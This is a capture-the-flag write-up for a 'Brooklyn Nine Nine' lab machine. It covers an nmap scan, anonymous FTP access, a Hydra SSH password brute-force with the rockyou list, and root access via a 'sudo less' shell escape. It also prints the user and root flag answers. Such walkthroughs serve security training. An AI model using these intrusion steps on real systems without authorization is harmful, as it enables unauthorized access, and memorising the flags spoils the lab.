# Enumeration

I have scan the machine using #nmap using this command

```bash

nmap -sC -sV -T4 "IP MACHINE"

```

and the result was : 

```

Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 10:23 EDT

Nmap scan report for 10.10.30.3

Host is up (0.16s latency).

Not shown: 997 closed tcp ports (reset)

PORT   STATE SERVICE VERSION

21/tcp open  ftp     vsftpd 3.0.3

| ftp-syst: 

|   STAT: 

| FTP server status:

|      Connected to ::ffff:10.11.41.47

|      Logged in as ftp

|      TYPE: ASCII

|      No session bandwidth limit

|      Session timeout in seconds is 300

|      Control connection is plain text

|      Data connections will be plain text

|      At session startup, client count was 3

|      vsFTPd 3.0.3 - secure, fast, stable

|_End of status

| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                === Anonymous login allowed ===

	|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt        ==== there is a file in FTP ===

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 

|   2048 167f2ffe0fba98777d6d3eb62572c6a3 (RSA)

|   256 2e3b61594bc429b5e858396f6fe99bee (ECDSA)

|_  256 ab162e79203c9b0a019c8c4426015804 (ED25519)

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

|_http-server-header: Apache/2.4.29 (Ubuntu)

|_http-title: Site doesn't have a title (text/html).

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel



Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 15.70 seconds

```

So we find 3 ports open that is 

- FTP 21 ==Anonymous Login allowed== --> there is a filed inside it

- SSH 22

- http 80 

I joined ftp using this command 

```

ftp " IP MACHINE "

```

Credentials : user:pass > anonymous:anonymous

```bash

230 Login successful.

Remote system type is UNIX.

Using binary mode to transfer files.

ftp> ls

229 Entering Extended Passive Mode (|||22727|)

150 Here comes the directory listing.

-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt

226 Directory send OK.

ftp> get note_to_jake.txt

```

download the note using 

```

ftp > get note_to_jake.txt

```

I faced problem that was

```

ftp> get note_to_jake

local: note_to_jake remote: note_to_jake

229 Entering Extended Passive Mode (|||23904|)

550 Failed to open file.

```

the solution for it write this command before u download 

```bash

ftp > passive

```

then download it.

```

└─# cat note_to_jake.txt

From Amy,



Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

```

we found two username that we maybe use it to login into a system.

# Information

Usernames :

- Jake

- Amy

let first try login into SSH using jake username. because his password is too weak.

I will use #hydra and Rockyou password list.

```bash

hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://"IP MACHINE"

```

the hydra found the password is : 

```

[22][ssh] host: 10.10.30.3   login: jake   password: 987654321

```



# Exploit 



lets join SSH using these credentials.

```

root@urmachine > ssh jake@"IP MACHINE"

password : 987654321

```

we are into jake machine now lets navigate to it. try to find user flag

```bash

jake@brookly_nine_nine:/home/holt$ cd /

jake@brookly_nine_nine:/$ cd /home

jake@brookly_nine_nine:/home$ ls

amy  holt  jake

jake@brookly_nine_nine:/home$ cd holt

jake@brookly_nine_nine:/home/holt$ ls

nano.save  user.txt

jake@brookly_nine_nine:/home/holt$ cat user.txt

ee11cbb19052e40b07aac0ca060c23ee

```

The answer to user flag is : ==ee11cbb19052e40b07aac0ca060c23ee==

the second question is find the root flag. so we need #Linux_privilege_escalation



# Privilege Escalation

First lets we check for Sudo command. where can we run Sudo without password?

for explain purpose lets check Sudo manual guide 

```bash

jake@machine > man sudo

```



```bash

 -l, --list  If no command is specified, list the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host.  A longer list format is used if this option is specified

                 multiple times and the security policy supports a verbose output format.



                 If a command is specified and is permitted by the security policy, the fully-qualified path to the command is displayed along with any command line arguments.  If command is specified but not allowed, sudo will

                 exit with a status value of 1.



```

this argument can help us. it will show us where is allowed to us to use Sudo command.

let's check for it

```

Matching Defaults entries for jake on brookly_nine_nine:

    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin



User jake may run the following commands on brookly_nine_nine:

    (ALL) NOPASSWD: /usr/bin/less

```

as we can see. **less** command is allowed to use with Sudo.

**less** : is reading command same as **cat** but **less** command can read u the file only to fill the screen. no need to read the entire file.



#GTFObins website can help is to get the root access. 

![[broklyn 1.png]]

we will get this

![[x.png]]

So lets we go back to jake machine

```

jake@brookly_nine_nine:/$ sudo less /etc/profile

jake@brookly_nine_nine:/$ !/bin/sh

```

first enter the first command then the second one.

and boom we got a root machine

navigate to the root directory

```

# cd /root

# ls

root.txt

# cat root.txt

-- Creator : Fsociety2006 --

Congratulations in rooting Brooklyn Nine Nine

Here is the flag: 63a9f0ea7bb98050796b649e85481845



Enjoy!!

```

the answer is ==63a9f0ea7bb98050796b649e85481845==



![](https://i.imgur.com/CM0KZ5z.png)





